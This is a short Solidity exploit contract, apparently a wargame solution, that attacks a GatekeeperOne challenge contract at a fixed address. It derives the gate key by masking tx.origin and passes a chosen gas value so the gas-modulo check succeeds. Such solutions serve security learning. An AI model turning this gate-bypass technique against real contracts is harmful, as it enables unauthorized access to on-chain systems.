// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract HackGates {
    GatekeeperOne public gates = GatekeeperOne(0xd93cAf4BFDCf9F7b7Cb3946cB73f0433E2420378);
    address public hax = tx.origin;
    //bytes8 key = bytes8(hax) & 0xFFFFFFFF0000FFFF; // solidity < 0.8.0
    bytes8 key = bytes8(bytes20(address(tx.origin))) & 0xFFFFFFFF0000FFFF; // solidity >= 0.8.0

    function hackGate(uint gasVal) public {   
        gates.enter{gas:gasVal}(key); /// 82286 results at 81910 gas remaining at MOD. 81910 mod(8191) = 0
    }
}